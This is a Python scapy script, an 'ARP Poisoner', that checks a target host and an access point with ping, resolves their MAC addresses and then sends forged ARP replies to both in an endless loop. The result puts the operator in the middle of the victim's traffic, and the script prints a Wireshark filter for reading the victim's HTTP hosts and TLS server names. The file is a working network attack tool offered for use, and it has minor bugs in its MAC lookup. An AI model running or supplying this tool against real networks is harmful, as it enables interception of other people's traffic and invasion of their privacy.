#!/usr/bin/python3 

import sys
import scapy.all as scapy
import subprocess
import signal
from termcolor import colored
import argparse
import time

# ctrl_c
def def_handler(sig, frame):
    print(colored("[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Get arguments
def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Poisoner")
    parser.add_argument("-t", required=True, dest="target", help="Target you want to poison")
    parser.add_argument("-a", required=True, dest="ap", help="Your access Point IP")
    return parser.parse_args()

# Verify if IP is up
def verify_ip(ip):
    response = subprocess.run(["timeout", "1", "ping", "-c", "1", ip], capture_output=True, text=True)
    if "1 packets transmitted, 1 received" in response.stdout:
        return True
    else:
        return False
# Verify MAC Adrress
def get_mac_address(ip):
    mac = scapy.getmacbyip(ip)
    if mac is None:
        print(f"[+] Could not resolve the mac address of {ip}, sending ARP request...")
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(pdst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answer = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answer:
            print(f"[+] Mac address for {ip}: {mac}")
        else:
            print(f"[!] Failed to get Mac address for {ip}!")
    return mac

# Poison Target and AP 
def spoof(target, ap):
    # Verify if target and AP reachability
    if not verify_ip(target):
        print(f"[!] Target {target} is not up! Exiting...")
        sys.exit(1)
    if not verify_ip(ap):
        print(f"[!] AP {ap} is not up! Exiting...")
    # Get mac Adressess
    target_mac = get_mac_address(target)
    ap_mac = get_mac_address(ap)

    if not target_mac or not ap_mac:
        print("[!] Failed to resolve mac addresses! Exiting...")
        sys.exit(1)
    print(colored("\n[+]", "yellow") + " " + colored("Success! Targets Spoofed", "green"))
    print(colored("[+]", "yellow") + " " + colored(f"Open Wireshark and apply the following filter: ip.addr == {target} && (http.host || tls.handshake.extensions_server_name)", "blue"))

    while True:
        victim_packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, psrc=ap, pdst=target, hwdst=target_mac)
        ap_packet = scapy.Ether(dst=ap_mac)  / scapy.ARP(op=2, psrc=target, pdst=ap, hwdst=ap_mac)
        scapy.sendp(victim_packet, verbose=False)
        scapy.sendp(ap_packet, verbose=False)
        time.sleep(2)

if __name__ == '__main__':
    args = get_arguments()
    spoof(args.target, args.ap)
